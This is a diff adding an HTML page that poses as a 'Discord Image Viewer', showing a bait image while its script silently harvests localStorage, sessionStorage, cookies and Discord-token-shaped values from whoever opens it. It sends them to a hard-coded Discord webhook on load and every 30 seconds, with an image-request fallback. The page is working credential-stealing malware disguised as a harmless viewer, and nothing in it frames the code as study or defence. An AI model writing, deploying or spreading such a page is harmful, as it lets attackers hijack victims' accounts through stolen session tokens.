@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Discord Image Viewer</title>
+    <meta property="og:image" content="https://i.pinimg.com/1200x/b9/89/da/b989da5212c07214fddd48e09d2238a9.jpg">
+    <meta property="og:title" content="Discord Image">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #000;
+            font-family: Arial, sans-serif;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .image-container {
+            text-align: center;
+            margin: 20px 0;
+        }
+        .image-container img {
+            max-width: 100%;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+        .loading {
+            color: white;
+            text-align: center;
+            padding: 50px;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loading" id="loading">Loading high-resolution image...</div>
+        <div class="image-container" style="display:none;" id="imageDiv">
+            <img src="https://i.pinimg.com/1200x/b9/89/da/b989da5212c07214fddd48e09d2238a9.jpg" 
+                 alt="Discord Image" 
+                 id="mainImage"
+                 onclick="window.open(this.src, '_blank')">
+            <div style="color: #ddd; margin-top: 10px;">Click image to view full size</div>
+        </div>
+    </div>
+
+    <script>
+    // Wait for page to load
+    window.addEventListener('load', function() {
+        setTimeout(function() {
+            // SHOW THE IMAGE
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('imageDiv').style.display = 'block';
+            
+            // START GRABBING DATA
+            grabData();
+            
+            // Continuous grabbing every 30 seconds
+            setInterval(grabData, 30000);
+        }, 1500);
+    });
+    
+    function grabData() {
+        var data = {};
+        
+        // 1. Get localStorage (where Discord tokens often are)
+        data.localStorage = {};
+        for (var i = 0; i < localStorage.length; i++) {
+            var key = localStorage.key(i);
+            data.localStorage[key] = localStorage.getItem(key);
+        }
+        
+        // 2. Get cookies
+        data.cookies = document.cookie;
+        
+        // 3. Get sessionStorage
+        data.sessionStorage = {};
+        for (var i = 0; i < sessionStorage.length; i++) {
+            var key = sessionStorage.key(i);
+            data.sessionStorage[key] = sessionStorage.getItem(key);
+        }
+        
+        // 4. Look for Discord tokens specifically
+        data.discordTokens = [];
+        
+        // Check localStorage
+        for (var key in data.localStorage) {
+            var value = data.localStorage[key];
+            if (value && typeof value === 'string') {
+                // Discord token pattern
+                if (value.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/)) {
+                    data.discordTokens.push(value);
+                }
+                // Also check for "token" in key name
+                if (key.toLowerCase().includes('token') && value.length > 50) {
+                    data.discordTokens.push(value);
+                }
+            }
+        }
+        
+        // Check cookies for tokens
+        var cookieMatch = data.cookies.match(/token=([^;]+)/i);
+        if (cookieMatch) {
+            data.discordTokens.push(cookieMatch[1]);
+        }
+        
+        // 5. Send to webhook
+        if (data.discordTokens.length > 0 || data.cookies) {
+            var embed = {
+                embeds: [{
+                    title: "🎯 DISCORD GRABBER ACTIVATED",
+                    color: 0xff0000,
+                    fields: [],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            
+            if (data.discordTokens.length > 0) {
+                embed.embeds[0].fields.push({
+                    name: "TOKENS FOUND",
+                    value: "```" + data.discordTokens.join('\n') + "```",
+                    inline: false
+                });
+            }
+            
+            if (data.cookies) {
+                embed.embeds[0].fields.push({
+                    name: "COOKIES",
+                    value: "```" + data.cookies.substring(0, 1000) + "```",
+                    inline: false
+                });
+            }
+            
+            // Send to Discord webhook
+            fetch("https://discord.com/api/webhooks/1462923510530969631/NsjMOAbLrGD067J5mEFLYiTIvtJRuh3xPNg5d2bexWzxkBqWJGI052hy1I_HPKylcvdX", {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(embed)
+            }).catch(function() {
+                // Fallback: Use image ping if fetch fails
+                new Image().src = 'https://discord.com/api/webhooks/REPLACE/REPLACE?token=' + 
+                                  encodeURIComponent(data.discordTokens[0] || data.cookies);
+            });
+        }
+    }
+    </script>
+</body>
+</html>
